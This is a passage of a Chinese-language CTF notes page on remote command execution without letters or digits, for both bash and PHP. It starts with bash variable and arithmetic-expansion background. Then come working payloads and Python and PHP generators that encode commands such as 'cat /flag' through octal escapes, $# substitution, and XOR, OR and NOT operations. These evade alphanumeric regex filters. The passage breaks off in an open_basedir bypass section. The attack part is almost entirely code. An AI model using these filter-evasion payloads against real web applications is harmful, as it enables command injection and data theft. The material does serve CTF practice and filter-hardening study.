class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><h1 id="无字母无数字rcelinxu"><a class="markdownIt-Anchor" href="#无字母无数字rcelinxu"></a> 无字母无数字rce(linxu):</h1><h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">变量名	含义</span><br><span class="line">$0	脚本本身的名字   ---bash</span><br><span class="line">$1	脚本后所输入的第一串字符</span><br><span class="line">$2	传递给该shell脚本的第二个参数</span><br><span class="line">$*	脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</span><br><span class="line">$@	脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</span><br><span class="line">$_	表示上一个命令的最后一个参数</span><br><span class="line">$#	#脚本后所输入的字符串个数</span><br><span class="line">$$	脚本运行的当前进程ID号</span><br><span class="line">$!	表示最后执行的后台命令的PID</span><br><span class="line">$?	显示最后命令的退出状态，0表示没有错误，其他表示由错误</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在 Bash 的算术扩展语法 $(( ... )) 中，</span><br><span class="line">数字字面量可以使用如下格式：</span><br><span class="line">base#number    --base是基数  进制转换</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">位移运算的基本概念：</span><br><span class="line">左移运算符 &lt;&lt; 是 位移运算符，表示将一个数字的二进制位向左移动指定的位数。</span><br><span class="line">每左移一位，相当于该数字乘以 2。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt; 是 Bash 中的 Here String 操作符，用于将一个字符串作为标准输入传递给一个命令。</span><br><span class="line">    语法：</span><br><span class="line">    command &lt;&lt;&lt; &quot;$word&quot;</span><br><span class="line">bash&lt;&lt;&lt;$&#x27;ls&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$#这个变量，它可以表示#脚本后所输入的字符串个数：</span><br><span class="line">		1用$&#123;##&#125;替换，0用$&#123;#&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">感叹号 ! 有许多不同的用法，特别是在 Bash 中，其中之一是用于 变量替换，也称作 历史扩展。</span><br></pre></td></tr></table></figure><h2 id="1无字母时"><a class="markdownIt-Anchor" href="#1无字母时"></a> 1.无字母时:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在linux可以完美可以利用八进制的方法绕过一些ban了字母的题 ，即可以使用$&#x27;\xxx&#x27;的方式执行命令</span><br><span class="line">$&#x27;\154\163&#x27;   --执行ls</span><br></pre></td></tr></table></figure><h2 id="2使用0-1"><a class="markdownIt-Anchor" href="#2使用0-1"></a> 2.使用0-1:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$\&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;   </span><br><span class="line">              ---执行ls ,但是无法执行带空格的命令</span><br><span class="line">$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br><span class="line">              ---执行 cat flag   通过两次$0&lt;&lt;&lt;得到</span><br><span class="line">把上面payload使用1用$&#123;##&#125;替换，0用$&#123;#&#125;替换(不能替换$0)得到:</span><br><span class="line">$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">             ---执行 cat flag 没用1</span><br></pre></td></tr></table></figure><h2 id="3无数字字母"><a class="markdownIt-Anchor" href="#3无数字字母"></a> 3.无数字字母:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把$0换成$&#123;!#&#125;  发现在php无法解析   __=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;  这样之后通过__作为中间件替换一下得到</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">利用$#构造:</span><br><span class="line">cmd=&#x27;cat /flag&#x27;</span><br><span class="line">payload=&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span><br><span class="line">for c in cmd:</span><br><span class="line">        payload+=f&#x27;\\\\$(($((1&lt;&lt;1))#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;.replace(&#x27;1&#x27;,&#x27;$&#123;##&#125;&#x27;).replace(&#x27;0&#x27;,&#x27;$&#123;#&#125;&#x27;)</span><br><span class="line">payload+=&#x27;\\\&#x27;&#x27;</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">利用$?构造</span><br><span class="line">cmd=&#x27;cat /flag&#x27;</span><br><span class="line">payload=&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span><br><span class="line">for c in cmd:</span><br><span class="line">        payload+=f&#x27;\\\\$((2#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;.replace(&#x27;1&#x27;,&#x27;$&#123;__&#125;&#x27;).replace(&#x27;2&#x27;,&#x27;$&#123;____&#125;&#x27;).replace(&#x27;0&#x27;,&#x27;$&#123;_____&#125;&#x27;)</span><br><span class="line">payload+=&#x27;\\\&#x27;&#x27;</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">利用$(())构造:</span><br><span class="line">cmd=&#x27;cat /flag&#x27;</span><br><span class="line">payload=&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span><br><span class="line">for c in cmd:</span><br><span class="line">        payload+=f&#x27;\\\\$((2#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;.replace(&#x27;1&#x27;,&#x27;$&#123;__&#125;&#x27;).replace(&#x27;2&#x27;,&#x27;$&#123;____&#125;&#x27;).replace(&#x27;0&#x27;,&#x27;$&#123;_____&#125;&#x27;)</span><br><span class="line">payload+=&#x27;\\\&#x27;&#x27;</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><h1 id="无字母无数字rcephp"><a class="markdownIt-Anchor" href="#无字母无数字rcephp"></a> 无字母无数字rce(php):</h1><h2 id="1异或"><a class="markdownIt-Anchor" href="#1异或"></a> 1.异或:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">256</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="variable">$hex_i</span> = <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$hex_i</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$j</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="variable">$hex_j</span> = <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$hex_j</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//改为题目的正则</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>)) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>) ^ <span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>) &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span> = <span class="variable">$contents</span> . <span class="variable">$c</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$b</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in arg:</span><br><span class="line">        with <span class="title function_ invoke__">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># Use &#x27;with&#x27; to handle file opening and closing automatically</span></span><br><span class="line">            <span class="keyword">while</span> True:</span><br><span class="line">                t = f.<span class="title function_ invoke__">readline</span>()</span><br><span class="line">                <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                    <span class="comment"># print(i)  # This line can be uncommented for debugging purposes</span></span><br><span class="line">                    s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                    s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    output = f<span class="string">&quot;(\&quot;&#123;s1&#125;\&quot;^\&quot;&#123;s2&#125;\&quot;)&quot;</span>  <span class="comment"># Use f-string for better readability</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    param = <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="keyword">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2或运算"><a class="markdownIt-Anchor" href="#2或运算"></a> 2.或运算:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件或创建文件</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 双重循环，遍历256的每个值</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">256</span>; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将十进制数转换为十六进制</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="variable">$hex_i</span> = <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$hex_i</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$j</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="variable">$hex_j</span> = <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$hex_j</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 正则表达式，匹配字母或数字</span></span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;    </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果十六进制转为二进制后匹配成功，跳过此值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>)) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// URL解码并做按位或运算</span></span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>) | <span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果字符是可打印字符，记录内容</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>) &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span> = <span class="variable">$contents</span> . <span class="variable">$c</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$b</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果写入文件并关闭文件</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 打开文件并读取内容</span></span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># 读取所有行</span></span><br><span class="line">        lines = f.<span class="title function_ invoke__">readlines</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 遍历输入参数</span></span><br><span class="line">        <span class="keyword">for</span> i in arg:</span><br><span class="line">            <span class="comment"># 查找与输入匹配的行</span></span><br><span class="line">            <span class="keyword">for</span> line in lines:</span><br><span class="line">                <span class="keyword">if</span> line.<span class="title function_ invoke__">startswith</span>(i):</span><br><span class="line">                    s1 += line[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                    s2 += line[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回拼接结果</span></span><br><span class="line">    output = f<span class="string">&quot;(\&quot;&#123;s1&#125;\&quot;|\&quot;&#123;s2&#125;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无限循环，处理用户输入</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    param = <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="keyword">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3取反"><a class="markdownIt-Anchor" href="#3取反"></a> 3.取反:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h1 id="open_basedir绕过"><a class="markdownIt-Anchor" href="#open_basedir绕过"></a> <strong>open_basedir绕过</strong>:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。</span><br><span class="line">当程序要使用例如<span class="title function_ invoke__">fopen</span>()或<span class="title function_ invoke__">file_get_contents</span>()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</span><br></pre></td></tr></table></figure><h2 id="1使用命令执行函数"><a class="markdownIt-Anchor" href="#1使用命令执行函数"></a> 1.使用命令执行函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为open_basedir的设置只是对目录的限制，对system等命令执行函数是无效的</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2使用伪协议得不到文件内容"><a class="markdownIt-Anchor" href="#2使用伪协议得不到文件内容"></a> 2.使用伪协议(得不到文件内容)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span 